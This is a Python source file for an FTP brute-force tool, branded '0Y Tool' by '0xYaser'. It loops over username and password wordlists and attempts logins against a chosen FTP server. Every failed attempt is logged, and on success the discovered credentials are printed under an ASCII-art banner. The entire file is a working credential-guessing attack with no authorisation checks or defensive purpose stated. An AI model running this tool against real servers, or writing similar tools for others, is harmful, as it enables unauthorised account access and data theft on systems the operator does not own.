import datetime
import os
from ftplib import FTP

import colorama

color = colorama.Fore
date = datetime.datetime.now().time()


def ftp_login(ftp_server, port, username, password, status):
    if port == None:
        port = 21
    num = 0
    ftp = FTP()
    if status == "1,0":
        for user in open(username, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                ftp.connect(ftp_server, port)
                ftp.login(user, password)
                ftp.dir()
                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")

                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 


{color.WHITE}            username :{color.GREEN} {user} 
{color.WHITE}            password :{color.GREEN} {password}
{color.WHITE}            host     :{color.CYAN} {ftp_server}
{color.WHITE}            port     :{color.YELLOW} {port}
                      """
                )
                exit()
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{user}{color.WHITE}:{color.YELLOW}{password}"
                )
    elif status == "0,1":
        for pas in open(password, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                ftp.connect(ftp_server, port)
                ftp.login(username, pas)
                ftp.dir()

                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")

                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

                         
{color.WHITE}            username :{color.GREEN} {username} 
{color.WHITE}            password :{color.GREEN} {pas}
{color.WHITE}            host     :{color.CYAN} {ftp_server}
{color.WHITE}            port     :{color.YELLOW} {port}
                      """
                )
                exit()
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{username}{color.WHITE}:{color.YELLOW}{pas}"
                )
    elif status == "1,1":
        for user in open(username, "r").read().splitlines():
            date = datetime.datetime.now().time()
            try:
                password2 = open(password, "r").read().splitlines()[num]
                ftp.connect(ftp_server, port)
                ftp.login(user, password2)
                ftp.dir()

                if os.name == "posix":
                    os.system("clear")

                elif os.name == "nt":
                    os.system("cls")

                print(
                    f"""
{color.YELLOW}
                         ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
{color.BLUE} 0Y Tool{color.YELLOW}                 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
{color.GREEN} By : 0xYaser {color.YELLOW}           ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 
                         ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░           
{color.WHITE} version [0.1] {color.YELLOW}          ░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░ 

                             
{color.WHITE}            username :{color.GREEN} {user} 
{color.WHITE}            password :{color.GREEN} {password2}
{color.WHITE}            host     :{color.CYAN} {ftp_server}
{color.WHITE}            port     :{color.YELLOW} {port}
                      """
                )
                exit()
            except:
                print(
                    f"{color.WHITE}[{color.BLUE}{date}{color.WHITE}] {color.WHITE}[{color.RED}Bad Login{color.WHITE}]  {color.YELLOW}{user}{color.WHITE}:{color.YELLOW}{password2}"
                )
            num = num + 1
